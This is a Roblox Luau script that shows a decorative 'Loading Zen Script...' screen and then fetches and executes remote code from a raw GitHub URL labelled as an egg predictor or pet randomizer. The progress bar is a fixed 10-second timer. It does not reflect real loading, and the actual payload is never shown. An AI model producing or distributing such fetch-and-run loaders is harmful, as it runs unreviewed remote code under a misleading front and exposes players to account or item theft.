--// Services
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")

--// ScreenGui Setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ZenLoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

--// Blur Effect
local blur = Instance.new("BlurEffect")
blur.Size = 20
blur.Parent = game.Lighting

--// Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0.5, 0, 0.25, 0)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BackgroundTransparency = 0.2
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

-- Rounded edges
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 20)

-- Gradient border
local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 255))
}
gradient.Rotation = 45

--// Title
local title = Instance.new("TextLabel")
title.Text = "Loading Zen Script..."
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0.4, 0)
title.Position = UDim2.new(0, 0, 0, 0)
title.Parent = mainFrame

--// Loading Bar Background
local barBG = Instance.new("Frame")
barBG.Size = UDim2.new(0.9, 0, 0.15, 0)
barBG.Position = UDim2.new(0.05, 0, 0.65, 0)
barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBG.BorderSizePixel = 0
barBG.Parent = mainFrame
Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 8)

--// Progress Bar
local progress = Instance.new("Frame")
progress.Size = UDim2.new(0, 0, 1, 0)
progress.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
progress.BorderSizePixel = 0
progress.Parent = barBG
Instance.new("UICorner", progress).CornerRadius = UDim.new(0, 8)

--// Percentage Label
local percentLabel = Instance.new("TextLabel")
percentLabel.Text = "0%"
percentLabel.Font = Enum.Font.Gotham
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.TextScaled = true
percentLabel.BackgroundTransparency = 1
percentLabel.Size = UDim2.new(1, 0, 1, 0)
percentLabel.Parent = barBG

--// Animate Progress Bar over 10 seconds
local totalDuration = 10
local steps = 100
local delayPerStep = totalDuration / steps

coroutine.wrap(function()
	for i = 1, steps do
		local progressValue = i / steps
		percentLabel.Text = tostring(math.floor(progressValue * 100)) .. "%"
		progress:TweenSize(UDim2.new(progressValue, 0, 1, 0), "Out", "Linear", delayPerStep, true)
		wait(delayPerStep)
	end

	wait(0.3)
	screenGui:Destroy()
	blur:Destroy()

	-- Execute the actual Zen script
	loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGardenVisual1/EggPredictor/refs/heads/main/PetRandomizer.lua"))()
end)()
